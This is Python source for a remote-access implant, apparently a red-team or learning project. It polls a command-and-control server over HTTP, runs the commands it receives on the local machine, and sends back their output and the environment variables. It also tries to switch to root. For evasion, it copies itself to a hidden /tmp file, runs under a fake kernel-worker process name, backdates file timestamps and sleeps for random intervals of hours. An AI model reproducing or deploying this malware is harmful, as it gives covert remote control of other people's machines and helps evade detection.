#!/usr/bin/env python3

import subprocess
import hashlib
import os
import sys
import uuid

import requests

try:
	import pwd
except ModuleNotFoundError:
	pwd = None
import shutil
import shlex
import time
import random
import pathlib
import base64

# TODO signed packets, not passwords
password = "password"
HOST, PORT = "0.0.0.0", 9998
debug = True

c2_id = 0


def make_get(url):
	"""
	Make Get request to C2 server
	Args:
		url: url of resource

	Returns: the data decoded from base64

	"""
	try:
		r = requests.get(f"http://{HOST}:{PORT}/{url}")
	except ConnectionRefusedError:
		return 400
	return base64.urlsafe_b64decode(bytes(r.text.encode('utf-8'))).decode('utf-8')


def make_post(url, data):
	"""
	Make Post request to C2 server
	Args:
		url: resource
		data: data, not encoded

	Returns: status code and response text

	"""
	data = base64.urlsafe_b64encode(bytes(data.encode('utf-8')))
	r = requests.post(f"http://{HOST}:{PORT}/{url}", data=data)
	return r.status_code


def handle(data):
	"""
	Handle incoming commands from C2
	Args:
		data: string with command format key::data::parameters::integrity, now list

	Returns: sends data to C2 server

	"""
	key = data[0]
	command = data[1]
	parameters = data[2]
	integrity = data[3]

	if verify(key, command, parameters, integrity):
		if command == "BUILTIN":
			stdout = run_builtin(parameters)
		else:
			stdout = run_command(command, parameters)
	else:
		stdout = f"Invalid command: {data}"

	output = f"Command: {command} {parameters}\n{stdout}"
	send_data(output)


def register():
	"""
	Register with C2 server
	Send uname with random salt

	Returns: make post request to C2 server
	"""
	uname = get_uname()
	generate_id()
	global c2_id
	code = make_post("register", f"{uname}::{c2_id}")
	if code == 200:
		return True
	return False


def request_commands():
	"""
	Make HTTP request

	Returns: the polling status and commands to execute
	"""
	global c2_id
	data = make_get(f"{c2_id}/commands").split()
	return data[0], data[1:]


def send_data(data):
	"""
	Make POST request to C2 server with command data
	Args:
		data:

	Returns:

	"""
	status = make_post("data", data)
	return status


def get_uname():
	"""
	Generate uname string

	Returns: the string containing uname string
	"""
	return f"{os.uname().sysname} {os.uname().release} {os.uname().version} {os.uname().machine}"


def generate_id():
	"""
	Generate a numerical id based on the uname and a random salt
	Returns:

	"""
	global c2_id
	c2_id = uuid.uuid4().int


def run_builtin(command):
	"""
	Run builtin command, not local terminal
	Args:
		command:

	Returns:

	"""
	if command == "name":
		return get_uname()
	elif command == "cwd":
		return os.getcwd()
	elif command == "env":
		return os.environ
	elif command == "pid":
		return str(os.getpid())


def run_command(command, parameters):
	"""
	Execute command on local terminal
	Args:
		command:
		parameters:

	Returns:

	"""
	try:
		# TODO add shelex processing
		process = subprocess.run([command, parameters], capture_output=True, check=True, encoding='utf-8')
	except subprocess.CalledProcessError:
		return "Error on Command"

	return process.stdout


def verify(key, command, parameters, integrity):
	"""
	Check hash of command, verifying that no data transmission errors have occurred, then check against password
	Args:
		key:
		command:
		parameters:
		integrity:

	Returns:

	"""
	# TODO use salt and hash
	if key != password:
		return False

	data = f"{key}:{command}:{parameters}"
	if hashlib.sha256(data.encode("utf-8")).hexdigest() != integrity:
		print("Data error detected!")
		return False
	return True


def get_pname(pid):
	"""
	get name of function from pid
	Args:
		pid:

	Returns:

	"""
	return os.system(f"ps -o cmd= {pid}")


def upgrade_shell():
	"""
	try to upgrade to root shell
	Returns:
	"""
	try:
		uid = pwd.getpwnam('root')[2]
		os.setuid(uid)
	except (PermissionError, AttributeError):
		pass


def become_silent():
	"""
	Go stealth, move to secret location, set presence IOC
	Returns:

	"""

	cmdline = sys.argv[0]

	# TODO randomize names, dependant on parent, windows location
	hidden, bandit = "/tmp/.mem_systemd", "[kworker/2:0-events]"
	if not check_mark() and cmdline != hidden:
		leave_mark()
		print("No presence detected, going in...")
		shutil.copyfile(cmdline, hidden)
		subprocess.run(["/bin/chmod", "+x", f"{hidden}"])
		subprocess.run(shlex.split(f"bash -c \"exec -a {bandit} {sys.executable} {hidden} &\""))
		subprocess.run(["/bin/chmod", "-x", f"{hidden}"])
		randomize_timestamp(hidden)
		print("Killing overt agent...")
		exit(0)
	if cmdline == hidden:
		print("Agent is covert!")
	else:
		print("Already present, killing...")
		leave_mark()
		# Should die if already on system
		exit(0)


def randomize_timestamp(file):
	"""
	Generate random timestamp for files created between a year and 6 months ago
	Args:
		file:

	Returns:

	"""
	set_stamp = time.time() - random.randrange(15778463, 31556926)
	os.utime(file, (set_stamp, set_stamp))


def leave_mark():
	"""
	Generate IOCs on machine, to leave presence clear
	"""
	# TODO add more names, randomize
	f = open(f"{str(pathlib.Path.home())}/.zshconf", "w")
	f.close()
	randomize_timestamp(f"{str(pathlib.Path.home())}/.zshconf")
	os.environ["BASH"] = "1"


def check_mark():
	"""

	Returns:

	"""
	if os.path.isfile(f"{str(pathlib.Path.home())}/.zshconf"):
		return True
	if os.environ.get("BASH") == "1":
		return True
	return False


def delay_for_mode(mode):
	"""
	Generate delay appropriate to mode
	Active - 30 seconds
	Passive - between 6 and 18 hours
	Args:
		mode:

	Returns:

	"""
	if mode == "active":
		delay = 30
	else:
		delay = random.randrange(21600, 64800)
	print(f"Delaying for {delay}s...")
	time.sleep(delay)


if __name__ == "__main__":

	if debug:
		try:
			os.remove(f"{str(pathlib.Path.home())}/.zshconf")
			os.environ["BASH"] = "0"
		except FileNotFoundError:
			pass
	upgrade_shell()
	become_silent()

	if not register():
		print("Failed to register with C2 server")

	last_commands = ""

	while 1:
		active, cmds = request_commands()

		cmd_hash = hashlib.md5(''.join(cmds).encode('utf-8')).hexdigest()

		if last_commands != cmd_hash:
			for cmd in cmds:
				handle(cmd.split("::"))
			last_commands = cmd_hash
		else:
			print("No change from C2")

		delay_for_mode(active)
